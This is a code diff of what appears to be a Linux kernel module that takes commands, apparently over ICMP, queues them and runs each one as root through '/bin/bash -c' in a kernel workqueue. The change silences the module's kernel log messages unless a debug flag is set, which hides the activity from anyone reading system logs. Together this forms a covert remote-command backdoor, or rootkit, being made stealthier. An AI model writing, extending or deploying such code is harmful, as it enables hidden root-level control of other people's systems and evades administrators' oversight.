@@ -61,8 +61,10 @@ static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *
 static void icmp_handle_work(struct work_struct *work) {
     int ret;
 
-    pr_info("Entering work handler...\n");
-    printk(KERN_DEBUG "Queue length: %d", atomic_read(&work_count));
+    #ifdef DEBUG_K
+        printk(KERN_DEBUG "Entering work handler...\n");
+        printk(KERN_DEBUG "Queue length: %d", atomic_read(&work_count));
+    #endif
     struct work_item *work_item = container_of(work, struct work_item, work);
 
     char *argv[] = { "/bin/bash", "-c", work_item->command, NULL };
@@ -112,12 +114,21 @@ static int queue_execute(command_t type, char *argument){
             return -1;
     }
 
+    #ifdef DEBUG_K
+        printk(KERN_DEBUG "Creating queue item...");
+    #endif
     struct work_item *work = kmalloc(sizeof(struct work_item), GFP_KERNEL);
     work->command = command;
 
+    #ifdef DEBUG_K
+        printk(KERN_DEBUG "Queueing queue item...");
+    #endif
     INIT_WORK(&work->work, icmp_handle_work);
     queue_work(work_queue, &work->work);
     atomic_inc(&work_count);
+    #ifdef DEBUG_K
+        printk(KERN_DEBUG "Enqueued");
+    #endif
 
     return 0;
 }
